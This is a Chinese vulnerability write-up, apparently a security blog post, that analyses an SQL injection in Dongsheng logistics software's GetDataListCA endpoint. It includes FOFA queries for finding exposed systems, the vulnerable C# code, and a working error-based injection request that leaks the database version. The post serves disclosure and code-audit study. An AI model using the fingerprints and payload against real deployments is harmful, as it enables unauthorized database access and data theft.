---
title: "东胜物流软件 GetDataListCA SQL注入漏洞"
source: https://mrxn.net/jswz/dongsheng-MsCwGenlegAccitems-GetDataListCA-sqli.html
asset_dir: assets/东胜物流软件-getdatalistca-sql注入漏洞
---

# 东胜物流软件 GetDataListCA SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/17 12:33
* 966浏览
* [0评论](#comment)
* 38分钟阅读

深入探索

安全

软件

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 GetDataListCA 接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

> 系统基于ASP.NET MVC 架构，因此和常规的稍微不同

看下MsCwGenlegAccitemsController里GetDataListCA的实现部分

深入探索

网络安全培训

恶意软件分析工具

安全工具开发

```
#region 期初列表操作
public ContentResult GetDataListCA(string PACCGID, string condition)
{
    if (PACCGID.Trim().IndexOf("root") > -1)
    {
        PACCGID = "ZC','FZ','GT','QY','CB','SY";
    }
    if (!string.IsNullOrEmpty(PACCGID))
    {
        condition += " and PACCGID in ('" + PACCGID + "')";
    }
    var dataList = MsCwGenlegAccitemsDAL.GetDataListCA(condition, Convert.ToString(Session["USERID"]));
    var json = JsonConvert.Serialize(new { Success = true, Message = "查询成功", totalCount = dataList.Count, data = dataList.ToList() });
    return new ContentResult() { Content = json };
}
```

深入探索

SQL注入检测工具

VPN服务

云安全解决方案

如果PACCGID不为空则直接将其拼接进condition语句中，然后带入MsCwGenlegAccitemsDAL.GetDataListCA中，其实现如下

SQL注入防护

```
#region 查询期初列表
static public List<MsCwAccitemsGl> GetDataListCA(string strCondition, string strUserID)
{
    string strCwSTARTGID = BasicDataRefDAL.GetCwSTARTGID(strUserID);
    string strCwACCDATE = BasicDataRefDAL.GetCwACCDATE(strUserID);
    var strSql = new StringBuilder();
    strSql.Append("SELECT GID,ACCID,ACCNAME,DETAILED,DC,ISFCY,ISDEPTACC,ISEMPLACC,ISCORPACC,ISITEMACC,REMARKS,[YEAR],[MONTH],PACCGID=(case when (PACCGID='ZC' or PACCGID='FZ' or PACCGID='GT' or PACCGID='QY' or PACCGID='CB' or PACCGID='SY') then '0' else PACCGID end),ACCATTRIBUTE,ACCTYPE,PACCID=(select top 1 ACCID from [cw_accitems_gl] as a where a.gid=cw_accitems_gl.PACCGID),PACCNAME=(select top 1 ACCNAME from [cw_accitems_gl] as b where b.gid=cw_accitems_gl.PACCGID),gid as [id],ACCID+' '+ACCNAME as [NAME],DR=isnull((select isnull(sum(QTYYEARDR),0) as QTYYEARDR from [cw_genleg_accitems] as c where c.[STARTGID]='" + strCwSTARTGID + "' and c.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),CR=isnull((select isnull(sum(QTYYEARCR),0) as QTYYEARCR from [cw_genleg_accitems] as d where d.[STARTGID]='" + strCwSTARTGID + "' and d.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),ISENABLE=isnull((select top 1 isnull(ISENABLE,0) as ISENABLE from [cw_genleg_accitems] as e where e.[STARTGID]='" + strCwSTARTGID + "' and e.ACCDATE=(select top 1 STARTMONTH from cw_design_startusing where [GID]='" + strCwSTARTGID + "') and e.LINKGID=cw_accitems_gl.GID),0),PFADR=isnull((select isnull(sum(PFADR),0) as PFADR from [cw_genleg_accitems] as c where c.[STARTGID]='" + strCwSTARTGID + "' and c.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),PFACR=isnull((select isnull(sum(PFACR),0) as PFACR from [cw_genleg_accitems] as d where d.[STARTGID]='" + strCwSTARTGID + "' and d.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1),0),STARTMONTH=isnull((select top 1 STARTMONTH from [cw_design_startusing] where (ISDELETE=0 or ISDELETE is null) and gid=(select top 1 GID from [cw_genleg_accitems] as d where d.[STARTGID]='" + strCwSTARTGID + "' and d.LINKGID=cw_accitems_gl.GID and IsInitialEntry=1)),0)");
    strSql.Append(" from [cw_accitems_gl] where [YEAR]=SUBSTRING('" + strCwACCDATE + "',1,4) and [STARTGID]='" + strCwSTARTGID + "'");
    //
    if (!string.IsNullOrEmpty(strCondition))
    {
        strSql.Append(strCondition);
    }
    strSql.Append(" order by [YEAR],ACCID");
    return SetDataCA(strSql);
}
```

深入探索

网页浏览器

文件大小转换

漏洞预警服务

strCondition也是直接拼接在strSql语句里，然后用SetDataCA进行执行

代码安全审计

[![东胜物流软件 GetDataListCA SQL注入漏洞](images/img-001-a09aeaac9a0f.webp)](https://image.mrxn.net/fb14aee36a694af488f0f5f4d270be52.webp)

全程无过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /MvcShipping/MsCwGenlegAccitems/GetDataListCA HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/x-www-form-urlencoded

PACCGID=-1')and 1<@@VERSION--
```

[![东胜物流软件 GetDataListCA SQL注入漏洞](images/img-002-2ee80b93c029.webp)](https://image.mrxn.net/7ca5fcfd9bc14d368b189646075a5529.webp)

通过报错注入在响应里回显数据库版本信息。

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[东胜物流软件 GetDataListCA SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsCwGenlegAccitems-GetDataListCA-sqli.html)  
文章链接：<https://mrxn.net/jswz/dongsheng-MsCwGenlegAccitems-GetDataListCA-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-MsCwGenlegAccitems-GetDataListCA-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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